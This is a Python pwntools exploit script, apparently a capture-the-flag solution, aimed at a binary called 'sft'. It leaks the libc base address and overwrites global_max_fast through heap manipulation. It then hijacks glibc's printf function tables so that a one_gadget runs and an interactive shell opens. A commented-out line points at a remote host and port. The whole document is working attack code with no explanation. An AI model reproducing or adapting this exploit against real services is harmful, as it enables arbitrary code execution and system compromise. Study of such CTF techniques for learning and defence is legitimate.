from pwn import *

printf_arginfo_size_function = 0x3ec870
printf_function = 0x3f0738
MAIN_ARENA = 0x3ebc40
MAIN_ARENA_DELTA = 0x60
GLOBAL_MAX_FAST = 0x3ed940

def offset2size(ofs):
    return ((ofs) * 2 - 0x10)
lg = lambda s: log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))

size1 = offset2size(printf_arginfo_size_function - MAIN_ARENA)
print hex(size1)
print hex(offset2size(printf_function - MAIN_ARENA))
#0x95a0

p = process("./sft")
# sh = remote("1.13.162.249",10001)
context.log_level='debug'
 
p.sendlineafter("big box, what size?\n",str(0x1850))
p.sendlineafter("bigger box, what size?\n",str(0x95e0))
p.sendlineafter("rename?(y/n)\n",'y')

libc_base = u64(p.recvuntil(b'\x7f')[-6:].ljust(8,'\x00')) - MAIN_ARENA - MAIN_ARENA_DELTA
global_max_fast = libc_base + GLOBAL_MAX_FAST
one_gadget = 0x10a41c+libc_base

lg("one_gadget")
lg("libc_base")
lg("global_max_fast")

# attach(p)
p.sendafter("new name!\n",p64(0)+p64(global_max_fast-0x10))
p.sendlineafter("Do you want to edit big box or bigger box?(1:big/2:bigger)\n",'2')
pause()
# p.sendlineafter("Do you want to edit big box or bigger box?(1:big/2:bigger)\n",'2')
p.send('a'*((ord('s')-2)*8)+p64(one_gadget)*2)
pause()
p.interactive()